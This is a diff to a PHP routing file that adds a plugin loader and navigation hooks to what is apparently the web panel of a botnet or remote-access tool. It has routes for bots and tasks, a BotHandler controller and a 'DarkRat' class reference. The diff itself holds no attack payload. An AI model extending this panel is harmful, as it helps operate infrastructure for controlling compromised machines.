@@ -5,13 +5,35 @@ ini_set('display_errors', 1);
 ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);
 $installer = true;
+$loadedVersion = "2.0";
 
+
+$navigation = array();
 if (file_exists(__DIR__ . '/../../config.php')) {
     $installer = false;
     require_once __DIR__ . '/../../config.php';
 }
+
+
+
+function register_navigation_tab($name,$iconPath){
+    $GLOBALS["navigation"][$name] = $iconPath;
+}
+
+function get_plugin_base_dir($pluginName){
+    return $GLOBALS["foundPlugins"][$pluginName]["plugindir"];
+}
+
+function get_plugin_include_dir($pluginName){
+    return $GLOBALS["foundPlugins"][$pluginName]["includeDir"];
+}
+
+
+
+
 require 'vendor/autoload.php';
 require_once __DIR__ . '/src/Classes/Bramus/Router/Router.php';
+//require_once __DIR__ . '/src/Classes/DarkRat/PluginBase.php';
 require __DIR__ . '/src/Classes/Smarty/Smarty.class.php';
 require __DIR__ . '/src/Controllers/Public/BotHandler.class.php';
 require __DIR__ . '/src/Controllers/Public/Install.class.php';
@@ -22,7 +44,11 @@ require __DIR__ . '/src/Controllers/Public/OrderApi.class.php';
 $tpl = new Smarty;
 $router = new \Bramus\Router\Router();
 
-//use GeoIp2\Database\Reader;
+
+
+$statementConfig = $GLOBALS["pdo"]->prepare("SELECT * FROM config WHERE id = ?");
+$statementConfig->execute(array("1"));
+$config = $statementConfig->fetch();
 
 
 if (!$installer) {
@@ -36,7 +62,7 @@ if (!$installer) {
     $router->all('/tasks/(\d+)', 'Main@tasks');
     $router->all('/logout', 'Main@logout');
     $router->all('/settings', 'Main@settings');
-    $router->all('/passrecovery', 'Main@passrecovery');
+    //$router->all('/passrecovery', 'Main@passrecovery');
     $router->all('/bots', 'Main@bots');
     $router->all('/taskdetails/(\d+)', 'Main@taskdetails');
     $router->all('/edituser/(\d+)', 'Main@edituser');
@@ -56,21 +82,37 @@ if (!$installer) {
 }
 
 
+
+$foundPlugins = array();
+foreach ( array_diff(scandir(__DIR__."/plugins"), array('.', '..'))  as $pluginName){
+
+    $foundPlugins[$pluginName] = array(
+        "name" => $pluginName,
+        "includeDir" => "/versions/".$GLOBALS["loadedVersion"]."/plugins/".$pluginName."/",
+        "active" =>(strpos($config["plugins"], $pluginName) != false) ? "1" : "0",
+    );
+
+    if($foundPlugins[$pluginName]["active"] == "1"){
+        include(__DIR__."/plugins/".$pluginName."/".$pluginName.".php");
+    }
+}
+
+
+
 $template = explode("@", $router->fn);
 
-$statementConfig = $GLOBALS["pdo"]->prepare("SELECT * FROM config WHERE id = ?");
-$statementConfig->execute(array("1"));
-$config = $statementConfig->fetch();
 
 
 
 $router->run(function () use ($tpl) {
+
     $tpl->caching = false;
     $tpl->compile_check = true;
     $tpl->force_compile = true;
     $tpl->setTemplateDir(__DIR__ . "/templates/".$GLOBALS["config"]["template"]."/");
     $templateDir = $GLOBALS["template"][0] . "/" . $GLOBALS["template"][1] . ".tpl";
-    $GLOBALS["tpl"]->assign("includeDir", "/versions/2.0/templates/".$GLOBALS["config"]["template"]."/");
+    $GLOBALS["tpl"]->assign("includeDir", "/versions/".$GLOBALS["loadedVersion"]."/templates/".$GLOBALS["config"]["template"]."/");
+    $GLOBALS["tpl"]->assign("navRegistrations", $GLOBALS["navigation"]);
     $tpl->display($templateDir);
 });
 
